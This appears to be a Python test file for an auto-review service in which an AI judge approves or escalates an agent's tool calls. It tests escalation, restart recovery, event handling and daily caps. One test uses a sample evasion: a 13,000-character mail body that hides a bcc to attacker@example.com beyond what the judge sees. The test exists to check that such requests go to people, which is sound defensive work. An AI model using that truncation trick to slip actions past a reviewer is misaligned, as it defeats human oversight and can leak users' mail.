"""TASK-0204: AI review findings 2, 8, 10 and 11 of the external review of v0.10.0 and v0.10.1. A request the judge
cannot see in full goes to people; a review lost to a restart goes to people; an event appended while a waiting run is
updated is kept; parallel reviews cannot pass the daily cap together."""
import json, threading, time, uuid
import pytest
from app.api import deps
from app.engine import approval_judge as J
from app.models import Run
from app.models.database import Database
from app.repositories import ApprovalRepository, RunRepository
from app.services.auto_review_service import AutoReviewService
from types import SimpleNamespace as NS
from tests.test_auto_review import H, audit, c, inbox, inline, notes, policy, row, start, user  # noqa: F401  (fixtures)


def test_a_request_longer_than_the_judge_sees_goes_to_people():
    """Finding 2: a `bcc` after a 13,000-character body was cut from the prompt, yet the request could be approved."""
    calls = []
    req = {"tool": "send_mail", "args": {"body": "x" * 13000, "bcc": "attacker@example.com"}}
    with pytest.raises(J.JudgeError) as e:
        J.ask("Mail to customers is fine.", req, "m", {}, invoke=lambda *a: calls.append(a) or ('{"decision": "approve", "confidence": 1}', {}))
    assert e.value.cause == "too_long" and not calls
    s = AutoReviewService(NS(reserve_auto=lambda *a: True, release_auto=lambda *a: None), NS(paused=lambda w: False),
                          lambda u, c: {"provider": "openai"}, judge=lambda *a: J.ask(*a, invoke=lambda *b: ('{"decision": "approve", "confidence": 1}', {})))
    r = s.review("u", "w", policy(), req)
    assert (r["outcome"], r["cause"]) == ("escalated", "too_long")


def test_an_event_appended_meanwhile_is_kept(tmp_path):
    """Finding 10: on SQLite update_waiting compared only the checkpoint, so an approval_review event appended between
    its read and its write was dropped while its tokens stayed counted."""
    db = Database(f"sqlite:///{tmp_path}/r.db"); db.migrate(); runs = RunRepository(db)
    runs.add(Run(id="r1", workflow_id="w", input="{}", events="[]", status="waiting", started=time.time(), owner="u", checkpoint="{}"))
    once = []
    def fn(cp):
        if not once:
            once.append(1); runs.add_waiting_event("r1", {"type": "approval_review", "usage": {"tokens_in": 5, "tokens_out": 1}})
        cp["_next_wait"] = {"type": "waiting", "node": "b"}; return True
    assert runs.update_waiting("r1", fn) is True
    types = [e["type"] for e in json.loads(runs.get("r1").events)]
    assert types == ["approval_review", "waiting"]


def test_parallel_reviews_cannot_pass_the_daily_cap(tmp_path):
    """Finding 11: the cap was read before the judge was asked, so four slots of one wave all passed a cap of 1."""
    db = Database(f"sqlite:///{tmp_path}/q.db"); db.migrate(); repo = ApprovalRepository(db)
    gate = threading.Barrier(4)
    def judge(*a):
        time.sleep(0.2); return {"decision": "approve", "confidence": 0.99, "reason": "", "flags": []}
    s = AutoReviewService(repo, NS(paused=lambda w: False), lambda u, c: {"provider": "openai"}, judge=judge)
    out = []
    def one():
        gate.wait(); out.append(s.review("u", "wf", policy(max_per_day=1), {"tool": "t", "args": {}})["outcome"])
    ts = [threading.Thread(target=one) for _ in range(4)]
    for t in ts: t.start()
    for t in ts: t.join()
    assert sorted(out) == ["approved", "escalated", "escalated", "escalated"]
    # an escalated review gives its slot back
    s2 = AutoReviewService(repo, NS(paused=lambda w: False), lambda u, c: {"provider": "openai"},
                           judge=lambda *a: {"decision": "escalate", "confidence": 0.5, "reason": "", "flags": []})
    assert s2.review("u", "wf2", policy(max_per_day=1), {})["outcome"] == "escalated"
    assert s.review("u", "wf2", policy(max_per_day=1), {})["outcome"] == "approved"


def test_a_review_lost_to_a_restart_goes_to_people(c, monkeypatch):
    """Finding 8: the review ran in a daemon thread; a restart while the judge was asked left the step waiting with
    nobody told, because in auto mode the run service leaves the notification to the review."""
    import app.services.approval_service as mod
    monkeypatch.setattr(mod.ApprovalService, "start", lambda self, job: None)  # the process stops before the review runs
    owner = user(c); wid, rid = start(c, owner)
    assert row(c, owner, wid, rid)["status"] == "waiting" and not notes(c, owner, "run_waiting")
    svc = deps.approval_service()
    assert svc.recover_reviews(time.time()) == 0  # a review still within its time is left alone
    assert svc.fire_deadlines(time.time() + 3600) >= 1
    assert next(e for e in audit(c, owner, rid) if e["action"].startswith("auto_"))["code"] == "restart"
    assert len(notes(c, owner, "run_waiting")) == 1 and len(inbox(c, owner, rid)) == 1
    assert svc.recover_reviews(time.time() + 3600) == 0  # once
